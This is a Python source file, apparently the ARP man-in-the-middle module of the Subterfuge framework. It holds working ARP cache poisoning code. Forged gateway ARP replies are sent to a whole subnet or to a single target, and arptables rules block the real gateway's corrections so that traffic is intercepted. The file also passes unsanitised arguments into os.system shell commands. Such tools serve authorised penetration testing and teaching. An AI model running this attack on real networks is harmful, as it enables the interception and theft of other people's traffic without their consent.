#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
sys.path.append('/usr/share/subterfuge')
sys.path.append('/usr/share')

#Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

import django
django.setup()

'''
from django.conf import settings
settings.configure(
DATABASES = {
    'default' : {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': "/usr/share/subterfuge/db",
        'USER': '',
        'PASSWORD': '',
        'HOST': '',
    }
}
)
'''


from django.db import models
from main.models import *

#Get Globals from Database
for settings in setup.objects.all():
	interface     = settings.iface
	gateway       = settings.gateway
	attackerip    = settings.ip
	routermac     = settings.routermac
	smartarp      = settings.smartarp
	arprate       = int(settings.arprate)

from errorhandler import notification_attackctrl

def main():

	#Checks for sane arguments
		if len(sys.argv) < 2:
			print "Invalid Arguments"
			os.system("python /usr/share/subterfuge/utilities/notification.py 'ARP-MITM Error' 'Invalid Arguments were entered.'")
			exit()

		#Help menu
		elif sys.argv[1] == "-h" or sys.argv[1] == "--help":
			print "\nARPMITM courtesy of r00t0v3rr1d3 \n"
			print "Usage: python arpmitm.py [OPTIONS] gateway\n"
			print "HELP MENU:"
			print "   -s,--single [target ip]	only poision a single host"
			print "   -r,--rearp			Properly rearp network"
			print "   -h,--help 			display this message"

		elif sys.argv[1] == "-r" or sys.argv[1] == "--rearp":
			print 'Re-arping the network, removing man-in-the-middle...\n'
			os.system("python /usr/share/subterfuge/utilities/notification.py 'Status' 'Re-arping the network, removing man-in-the-middle.'")
			rearp(sys.argv[2])
		elif sys.argv[1] == "-s" or sys.argv[1] == "--single":
		   print 'Poisoning a single host: ' + sys.argv[2] + '...\n'
		   try:
		      os.system("python /usr/share/subterfuge/utilities/notification.py 'Status' 'Poisoning a single host.'")
		      poisonsingle(sys.argv[2], sys.argv[3])
		   except:
		      notification_attackctrl("no-single-target")
		      print "Could not poison single target: no target found!"
		elif len(sys.argv) < 3:
			print "Poisoning the entire subnet...\n"
			os.system("python /usr/share/subterfuge/utilities/notification.py 'Status' 'Poisoning the entire subnet.'")
			poisonall(sys.argv[1])

def poisonall(gateway):
	os.system('ping -c 1 ' + gateway + ' 1 > /dev/null 2 > /dev/null')
	a = os.popen('arp ' + gateway)
	result = a.read()
	try:
	   mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result).groups()[0]
	   os.system("arp -s " + gateway + " " + mac)
	   setup.objects.update(routermac = mac)
	   time.sleep(.5)
	   packet = ARP()
	   packet.op = 2
	   packet.psrc = gateway
	   packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
	   temp2 = gateway.rpartition(".")
	   random = temp2[0]
	   random = random + ".37"
	   packet.pdst = random
	   time.sleep(.5)
	   #do not allow router re-arps through to already poisoned hosts
	   os.system("arptables -F")
	   os.system("arptables -A FORWARD -s " + gateway + " -j DROP")
	   while 1:
	      send(packet, verbose=0)
	      time.sleep(arprate)
	except:
		print 'Unable to determine gateway. Please ensure proper network connectivity.'
		os.system("python /usr/share/subterfuge/utilities/notification.py 'ARP-MITM Error' 'Unable to determine gateway. Please ensure proper network connectivity.'")

def poisonsingle(targetip, gatewayip):
   gatewaymac = ''
   targetmac = ''
   os.system('ping -c 1 ' + gatewayip + ' 1 > /dev/null 2 > /dev/null')
   os.system('ping -c 1 ' + targetip + ' 1 > /dev/null 2 > /dev/null')
   
   a = os.popen('arp ' + gatewayip)
   result = a.read()
   try:
      gatewaymac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result).groups()[0]
      os.system("arp -s " + gatewayip + " " + gatewaymac)
      setup.objects.update(routermac = gatewaymac)
           
   except:
      print 'Unable to determine gateway MAC. Please ensure proper network connectivity.'
      os.system("python /usr/share/subterfuge/utilities/notification.py 'ARP-MITM Error' 'Unable to determine gateway MAC. Please ensure proper network connectivity.'")
      exit(0)

   b = os.popen('arp ' + targetip)
   result2 = b.read()
   try:
      targetmac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result2).groups()[0]
      #setup.objects.update(routermac = gatewaymac)

   except:
      print 'Unable to determine target MAC. Please ensure target IP was entered properly.'
      os.system("python /usr/share/subterfuge/utilities/notification.py 'ARP-MITM Error' 'Unable to determine target MAC. Please ensure target IP was entered properly.'")
      exit(0)

   time.sleep(.5)
   packet = ARP()
   packet.op = 2
   packet.psrc = gatewayip
   packet.hwdsk = targetmac
   packet.pdst = targetip
   time.sleep(.5)
   #do not allow router re-arps through to already poisoned hosts
   os.system("arptables -F")
   os.system("arptables -A FORWARD -s " + gatewayip + " -j DROP")
   while 1:
      send(packet, verbose=0)
      time.sleep(arprate)

def rearp(gateway):
	os.system("arptables -F")
	packet = ARP()
	packet.op = 2
	
	try:
		mac = routermac
		macaddr = mac.rstrip("\n")
		packet.hwsrc = macaddr
		packet.psrc = gateway
		packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
		temp2 = gateway.rpartition(".")
		random = temp2[0]
		random = random + ".37" #random ip  - required
		packet.pdst = random
		for i in range(0,5):
	   		send(packet, verbose=0)
	   		time.sleep(1)
	   		send(packet, verbose=0)
		print 'Network Re-ARP Complete'
		os.system("python /usr/share/subterfuge/utilities/notification.py 'Status' 'Network Re-ARP Complete.'")
		
	except:
		print 'An error occured. Re-ARPing the network failed.'
		os.system("python /usr/share/subterfuge/utilities/notification.py 'ARP-MITM Error' 'Re-ARPing the network failed.'")
		
if __name__ == '__main__':
	main()




